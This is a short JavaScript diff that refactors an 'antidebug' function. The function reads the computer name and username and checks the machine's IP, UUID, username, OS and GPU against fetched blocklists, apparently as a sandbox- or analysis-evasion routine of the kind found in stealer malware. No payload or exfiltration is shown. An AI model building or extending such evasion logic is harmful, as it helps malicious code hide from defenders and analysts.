@@ -57,8 +57,8 @@ const uuidBlocked = async (a) => await checkBlocked("uuids", a);
 
 const ipBlocked = async (s) => await checkBlocked("ips", s);
 
-const antidebug = async (a, d, r, i, c, l, q, ñ, s, w, z) => {
-  if (a === false) return;
+const antidebug = async (res, d, r, i, c, l, q, ñ, s, w, z) => {
+  if (res === false) return;
   try {
     const [p, u] = [process.env.COMPUTERNAME || "Not found", process.env.USERNAME || "Not found"];
     const [g, h, j, k, f, m] = await Promise.all([ipBlocked(l), uuidBlocked(i), usernameBlocked(u), nameBlocked(p), osBlocked(q), gpuBlocked(s)]);
@@ -73,6 +73,4 @@ const antidebug = async (a, d, r, i, c, l, q, ñ, s, w, z) => {
   }
 };
 
-module.exports = {
-  antidebug
-};
+module.exports.antidebug = antidebug;
